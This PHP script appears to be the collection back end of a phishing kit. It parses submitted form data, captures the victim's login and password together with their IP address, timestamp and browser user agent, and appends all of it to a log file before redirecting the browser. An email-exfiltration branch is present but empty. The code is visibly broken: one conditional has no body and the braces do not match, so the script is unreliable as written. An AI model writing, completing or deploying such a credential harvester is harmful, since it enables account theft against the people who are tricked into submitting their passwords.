<?php  
  
  
$exfilemail = "";   
$logpath = "log";   
  
$data = file_get_contents('php://input');  
parse_str($data, $parsed);  
  
  
$ip = getenv("REMOTE_ADDR");  
  
  
$timestamp = date("D M d, Y g:i a");  
$browser = $_SERVER['HTTP_USER_AGENT'];  
  
  
$message .= "=============+=============\n";  
$message .= "Username/Email:	" . $parsed['login'] . "\n";  
$message .= "Password:	" . $parsed['password'] . "\n";  
$message .= "IP: 		" . $ip . "\n";  
$message .= "Date:		" . $timestamp . "\n";  
$message .= "User Agent:	" . $browser . "\n";  
$message .= "===========================\n\n\n";  
  
if ($exfilemail != "") 
  
}  
  
if ($logpath != "")  
    $handle = fopen($logpath, 'a');  
    fwrite($handle, $message);  
    fclose($handle);  
    
header('Location: ""');  
  
?>
